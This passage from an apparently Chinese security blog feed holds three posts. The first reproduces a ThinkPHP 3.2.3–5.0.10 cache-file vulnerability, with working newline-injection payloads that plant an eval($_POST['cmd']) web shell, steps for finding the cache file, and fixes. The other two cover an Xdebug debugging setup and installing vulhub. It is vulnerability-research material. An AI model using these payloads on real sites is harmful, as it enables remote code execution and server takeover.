    <content type="html"><![CDATA[<h1 id="phpthink3-2-3-5-0-10缓存函数缺陷"><a href="#phpthink3-2-3-5-0-10缓存函数缺陷" class="headerlink" title="phpthink3.2.3-5.0.10缓存函数缺陷"></a>phpthink3.2.3-5.0.10缓存函数缺陷</h1><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="thinkphp3-2-3"><a href="#thinkphp3-2-3" class="headerlink" title="thinkphp3.2.3"></a>thinkphp3.2.3</h3><ol><li><p>漏洞文件位置(一般审计得出)</p><p><code>http://domain/index.php/Home/Index/get?id=%0d%0aeval($_POST[&#39;cmd&#39;]);%0d%0a//</code></p></li><li><p>缓存文件为缓存名的md5值，这里采用md5（name）=b068931cc450442b63f5b3d276ea4297</p><p><code>http://domain/Application/Runtime/Temp/b068931cc450442b63f5b3d276ea4297.php</code></p></li><li><p>之后蚁剑连接。</p></li></ol><h3 id="thinkphp5-0-5"><a href="#thinkphp5-0-5" class="headerlink" title="thinkphp5.0.5"></a>thinkphp5.0.5</h3><ol><li><p>漏洞文件位置(一般审计得出)</p><p><code>http://domain/public/index.php/Home/Index/index</code></p><p>POST数据 :<code>con=%0d%0aeval($_POST[&#39;cmd&#39;]);%0d%0a//</code></p></li><li><p>缓存文件位置b0文件夹是md5(cache-name)前2位。</p><p><code>http://domain/runtime/cache/b0/b068931cc450442b63f5b3d276ea4297.php</code></p></li><li><p>蚁剑连接</p></li></ol><h2 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h2><ul><li>使用<code>S()</code>函数或者<code>Cache()</code>函数的位置不确定，尽量拿源码分析。</li><li>使用缓存函数的<code>name</code>变量未知，拿源码分析或尝试常用的缓存名<code>name</code>、<code>key</code></li></ul><h2 id="3-2-3漏洞复现"><a href="#3-2-3漏洞复现" class="headerlink" title="3.2.3漏洞复现"></a>3.2.3漏洞复现</h2><ul><li><p>直接跟进到<code>/Library/Think/Cache/File.class.php</code>文件，看到set方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&#x2F;**</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">     * 写入缓存</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">     * @access public</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">     * @param string $name 缓存变量名</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">     * @param mixed $value  存储数据</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">     * @param int $expire  有效时间 0为永久</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">     * @return boolean</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">     *&#x2F;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">    public function set($name,$value,$expire&#x3D;null) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">        N(&#39;cache_write&#39;,1);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">        if(is_null($expire)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">            $expire &#x3D;  $this-&gt;options[&#39;expire&#39;];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">        $filename   &#x3D;   $this-&gt;filename($name);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">        $data   &#x3D;   serialize($value);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">        if( C(&#39;DATA_CACHE_COMPRESS&#39;) &amp;&amp; function_exists(&#39;gzcompress&#39;)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">            &#x2F;&#x2F;数据压缩</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">            $data   &#x3D;   gzcompress($data,3);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">        if(C(&#39;DATA_CACHE_CHECK&#39;)) &#123;&#x2F;&#x2F;开启数据校验</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">            $check  &#x3D;  md5($data);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">        &#125;else &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">            $check  &#x3D;  &#39;&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">        $data    &#x3D; &quot;&lt;?php\n&#x2F;&#x2F;&quot;.sprintf(&#39;%012d&#39;,$expire).$check.$data.&quot;\n?&gt;&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">        &#x2F;&#x2F;data参数经过序列化，直接被写到文件内。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">        </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">        $result  &#x3D;   file_put_contents($filename,$data);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">        if($result) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">            if($this-&gt;options[&#39;length&#39;]&gt;0) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">                &#x2F;&#x2F; 记录缓存队列</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;queue($name);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">            &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line">            clearstatcache();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">            return true;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line">        &#125;else &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">            return false;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr></table></figure></li><li><p>写一个调用缓存函数的的方法，运行一下。看看写进去什么</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">namespace Home\Controller;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">use Think\Controller;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">class IndexController extends Controller &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    public function index()&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">        $a&#x3D;I(&#39;post.a3&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">        S(&#39;name&#39;,$a);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure></li><li><p>在set方法下断点，访问 <code>http://localhost/index.php/Home/Index/index.html</code> ，post数据：<code>a3=aaaa</code></p><p><img src="/images/tp3%E7%BC%93%E5%AD%98-1.png" alt="debug"></p><p>可以看到$data参数经过序列化，直接写入php后缀的文件。F9运行可以看到，在<code>Application/Runtime/Temp/</code>文件夹下生成了php文件。</p><p><img src="/images/tp3%E7%BC%93%E5%AD%98-2.png" alt="cachefile"></p><p>写入到文件被行注释了。</p></li><li><p><code>$data</code>参数未过滤<code>%0d%0a</code>可以用换行来绕过行注释，尝试post数据：</p><p><code>a3=%0d%0aeval($_POST[&#39;cmd&#39;]);%0d%0a//</code></p><p><img src="/images/tp3%E7%BC%93%E5%AD%98-3.png" alt="file-cache"></p></li><li><p>之后用蚁剑连接成功</p><p><img src="/images/tp3%E7%BC%93%E5%AD%98-4.png" alt="antsword"></p></li></ul><h2 id="5-0-5漏洞复现"><a href="#5-0-5漏洞复现" class="headerlink" title="5.0.5漏洞复现"></a>5.0.5漏洞复现</h2><ul><li><p>漏洞代码与3.2.3差不多，不一样的在缓存目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">protected function getCacheKey($name)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">        $name &#x3D; md5($name);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">        if ($this-&gt;options[&#39;cache_subdir&#39;]) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">            &#x2F;&#x2F; 使用子目录</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">            $name &#x3D; substr($name, 0, 2) . DS . substr($name, 2);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">        if ($this-&gt;options[&#39;prefix&#39;]) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">            $name &#x3D; $this-&gt;options[&#39;prefix&#39;] . DS . $name;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">        $filename &#x3D; $this-&gt;options[&#39;path&#39;] . $name . &#39;.php&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">        $dir      &#x3D; dirname($filename);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">        if (!is_dir($dir)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">            mkdir($dir, 0755, true);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">        return $filename;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr></table></figure></li><li><p>在index控制器写如下代码：</p><p><img src="/images/tp3%E7%BC%93%E5%AD%98-5.png" alt="images"></p></li><li><p>之后访问 <code>http://localhost/public/index.php/Home/index</code>POST数据：<code>con=%0aeval($_POST[&#39;cmd&#39;]);%0d//</code></p></li><li><p>最终在 <code>runtime/cache/b0/68931cc450442b63f5b3d276ea4297.php</code>文件生成shell：</p><p><img src="/images/tp3%E7%BC%93%E5%AD%98-6.png" alt="image2"></p></li><li><p>之后访问蚁剑 <code>http://localhost/runtime/cache/b0/68931cc450442b63f5b3d276ea4297.php</code></p><p><img src="/images/tp3%E7%BC%93%E5%AD%98-7.png" alt="images3"></p></li></ul><h2 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h2><p>在复现的时候看到CMS-hunter里对这个漏洞有这个描述：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">个人在复现这个漏洞的时候发现5.0.x版本的TP并不能直接访问到缓存文件所在的目录，因此可以情况下不能触发该漏洞。在3.2.x版本是可以直接从浏览器访问到缓存文件的。</span></pre></td></tr></table></figure><p>但在个人复现的时候并没有出现这个情况。</p><p>所以说一切还是自己复现一边才能填坑</p><h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><ul><li><p>过滤换行符</p><p>在$data写入文件之前过滤</p><p><code>$data = str_replace(PHP_EOL, &#39;&#39;, $data);</code></p></li><li><p>禁止访问目录</p><p>在<code>Runtime</code>目录添加<code>.htaccess</code>文件，内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">deny from all</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;IfModule&gt;</span></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      think系列之 thinkphp3.2.3-thinkphp5.0.10缓存漏洞复现
    
    </summary>
    
    
      <category term="漏洞" scheme="http://h3art3ars.github.io/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="ctf" scheme="http://h3art3ars.github.io/tags/ctf/"/>
    
      <category term="漏洞" scheme="http://h3art3ars.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="复现" scheme="http://h3art3ars.github.io/tags/%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="thinkphp" scheme="http://h3art3ars.github.io/tags/thinkphp/"/>
    
  </entry>
  
  <entry>
    <title>xdebug特定环境配置</title>
    <link href="http://h3art3ars.github.io/2019/12/12/xdebug%E7%89%B9%E5%AE%9A%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    <id>http://h3art3ars.github.io/2019/12/12/xdebug%E7%89%B9%E5%AE%9A%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</id>
    <published>2019-12-12T11:09:54.000Z</published>
    <updated>2019-12-21T13:09:00.925Z</updated>
    
    <content type="html"><![CDATA[<h2 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h2><p>chrome</p><p>phpstudy 8.0.9.3</p><ul><li>此法只适合文件在网站根目录，因此需要自己配置添加网站，将要调试的项目放在此目录</li><li>php 7.3.4</li></ul><p>phpstorm2019</p><h2 id="浏览器chrome配置"><a href="#浏览器chrome配置" class="headerlink" title="浏览器chrome配置"></a>浏览器chrome配置</h2><p>下载 Xdebug-helper</p><h2 id="phpstudy"><a href="#phpstudy" class="headerlink" title="phpstudy"></a>phpstudy</h2><ol><li><p>在此版本phpstudy中，只有php7.3.4中有php_xdebug扩展.开启此扩展。</p></li><li><p>找到对应php.ini文件。</p></li><li><p><strong>重要：搜索文件找到开启的extension项：<code>extension：php_xdebug</code> 用 <code>;</code>注释掉。因为phpstudy开启这个扩展，但需要的是<code>zend_extension</code></strong></p></li><li><p>以下内容添加到php.ini尾部</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">zend_extension&#x3D;xdebug</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">[XDebug]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">;调试功能模块儿</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">;extension&#x3D;php_xdebug.dll</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">;下面是php_xdebug在phpstudy中的位置，根据情况修改，重要！！！！</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">zend_extension &#x3D; &quot;D:\phpstudy\Extensions\php\php7.3.4nts\ext\php_xdebug.dll&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">xdebug.remote_handler&#x3D;dbgp</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">xdebug.idekey&#x3D; &quot;PHPSTORM&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">;开启远程调试</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">xdebug.remote_enable &#x3D; On</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">;远程主机</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">xdebug.remote_host&#x3D;localhost</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">;主机端口，重要！！！！</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">xdebug.remote_port&#x3D;9001</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">;开启自动跟踪</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">xdebug.auto_trace &#x3D; On</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">;开启异常跟踪</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">xdebug.show_exception_trace &#x3D; On</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">;开启远程调试自动启动</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">xdebug.remote_autostart &#x3D; On</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">;收集变量</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">xdebug.collect_vars &#x3D; On</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">;收集返回值</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">xdebug.collect_return &#x3D; On</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">;收集参数</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">xdebug.collect_params &#x3D; On</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">;临时跟踪信息输出，按需修改</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">;xdebug.trace_output_dir&#x3D;&quot;D:\phpstudy\Extensions\php\php7.3.4nts\tmp&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">;显示局部变量</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">xdebug.show_local_vars &#x3D; On</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">xdebug.profiler_enable &#x3D; On</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">;xdebug.profiler_output_dir &#x3D;&quot;D:\phpstudy\Extensions\php\php7.3.4nts\tmp&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">xdebug.trace_enable_trigger &#x3D;On</span></pre></td></tr></table></figure></li><li><p>重启apache服务</p></li></ol><h2 id="phpstorm配置"><a href="#phpstorm配置" class="headerlink" title="phpstorm配置"></a>phpstorm配置</h2><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a><strong>注意</strong></h3><p>每步配置完成后需点击右下角：<code>Apply</code>！！！</p><h3 id="php解释器配置"><a href="#php解释器配置" class="headerlink" title="php解释器配置"></a>php解释器配置</h3><p>File-&gt;Setting-&gt;Language&amp;Frameworks-&gt;PHP</p><p>php版本7.3.4。其他的正常配置解释器即可。</p><h3 id="debug配置"><a href="#debug配置" class="headerlink" title="debug配置"></a>debug配置</h3><p>File-&gt;Setting-&gt;Language&amp;Frameworks-&gt;PHP-&gt;Debug</p><p>此步只需更改<code>X-debug port</code>为9001，即第二步在php.ini中配置项为<code>xdebug.remote_port</code>的值</p><h3 id="DBGp-Proxy配置"><a href="#DBGp-Proxy配置" class="headerlink" title="DBGp Proxy配置"></a>DBGp Proxy配置</h3><p>File-&gt;SFetting-&gt;Language&amp;Frameworks-&gt;PHP-&gt;Debug-&gt;DBGp Proxy</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">IDE key:PHPSTORM</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;第二步在php.ini中配置项为xdebug.idekey的值</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">HOST:http:&#x2F;&#x2F;test.com</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;为要调试的项目配置的网站。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;不要用类似于http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;test.php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">Port:80</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;服务器的监听地址</span></pre></td></tr></table></figure><p>File-&gt;SFetting-&gt;Language&amp;Frameworks-&gt;PHP-&gt;Server</p><ol><li>点加号添加，Name随便，下面要用。</li><li>Host填调试项目网站。eg:<a href="http://test.com" target="_blank" rel="noopener">http://test.com</a></li><li>Port:80 </li><li>Debugger:Xdebug</li></ol><h3 id="最终调试前配置"><a href="#最终调试前配置" class="headerlink" title="最终调试前配置"></a>最终调试前配置</h3><p>Run-&gt;Edit Configurations</p><ol><li>点击<code>+</code></li><li>选择Php Web Page</li><li>Name随便</li><li>Server选择上一步添加Server的Name</li><li>Start URL: <a href="http://test.com" target="_blank" rel="noopener">http://test.com</a></li><li>Browser: Chrome</li></ol><p>配置完毕</p><h3 id="食用"><a href="#食用" class="headerlink" title="食用"></a>食用</h3><p>浏览器的<code>Xdebuger helper</code>选择<code>Debug</code></p><p>phpstorm点击右上角电话图标开始监听</p><p>phpstorm点击右上角甲壳虫图标开始调试</p><p>注意不能浏览器直接访问，要点击甲壳虫图标</p><p>如果浏览器访问时，url参数含有<code>XDEBUG_SESSION_START=XXXXX</code>参数，cookie中有 <code>XDEBUG_SESSION =PHPSTORM</code>则成功</p><h3 id="后续调试超时问题"><a href="#后续调试超时问题" class="headerlink" title="后续调试超时问题"></a>后续调试超时问题</h3><p>调试时，还没调试几十秒钟就超时了。设置一下。</p><p>找到httpd.conf</p><p>查找 <code>LoadModule fcgid_module modules/mod_fcgid.so</code>模块，保证不被注释</p><p>在末尾添加以下配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;IfModule fcgid_module&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"> FcgidProcessLifeTime 8200</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"> FcgidIOTimeout 8200</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"> FcgidConnectTimeout 4000</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"> &lt;&#x2F;IfModule&gt;</span></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      phpstudy8.0.9(2019)+phpstorm2019+xdebug特定版本的详细配置，搭建调试环境。便于php代码的动态审计。
    
    </summary>
    
    
      <category term="tools" scheme="http://h3art3ars.github.io/categories/tools/"/>
    
    
      <category term="tools" scheme="http://h3art3ars.github.io/tags/tools/"/>
    
      <category term="php" scheme="http://h3art3ars.github.io/tags/php/"/>
    
      <category term="调试" scheme="http://h3art3ars.github.io/tags/%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>vulhub简单安装</title>
    <link href="http://h3art3ars.github.io/2019/12/11/vulhub-install/"/>
    <id>http://h3art3ars.github.io/2019/12/11/vulhub-install/</id>
    <published>2019-12-11T07:53:39.000Z</published>
    <updated>2019-12-11T07:56:22.354Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vulhub-安装使用"><a href="#vulhub-安装使用" class="headerlink" title="vulhub  安装使用"></a>vulhub  安装使用</h1><h3 id="已备环境"><a href="#已备环境" class="headerlink" title="已备环境"></a>已备环境</h3><ol><li>python3</li><li>docker</li></ol><h3 id="安装其他环境"><a href="#安装其他环境" class="headerlink" title="安装其他环境"></a>安装其他环境</h3><ol><li><p>启动docker服务</p><p><code>service docker start</code></p></li><li><p>安装docker-compose</p><p><code>pip3 install docker-compose</code></p></li></ol><h3 id="下载vulhub并解压"><a href="#下载vulhub并解压" class="headerlink" title="下载vulhub并解压"></a>下载vulhub并解压</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;archive&#x2F;master.zip -O vulhub-master.zip</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">unzip vulhub-master.zip</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">cd vulhub-master</span></pre></td></tr></table></figure><h3 id="选择并享用"><a href="#选择并享用" class="headerlink" title="选择并享用"></a>选择并享用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">cd ****&#x2F;****</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">docker-compose build</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">docker-compose down -v</span></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      安装vulhub以用来建立docker环境供自己练习
    
    </summary>
    
    
      <category term="学习" scheme="http://h3art3ars.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="tools" scheme="http://h3art3ars.github.io/tags/tools/"/>
    
      <category term="学习" scheme="http://h3art3ars.github.io/tags/%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="漏洞利用" scheme="http://h3art3ars.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>ImageMagick</title>
    <link href="http://h3art3ars.github.io/2019/12/11/ImageMagick/"/>
    <id>http://h3art3ars.github.io/2019/12/11/ImageMagick/</id>
    <published>2019-12-11T07:46:16.000Z</published>
    <updated>2019-12-14T02:44:06.039Z</updated>
    
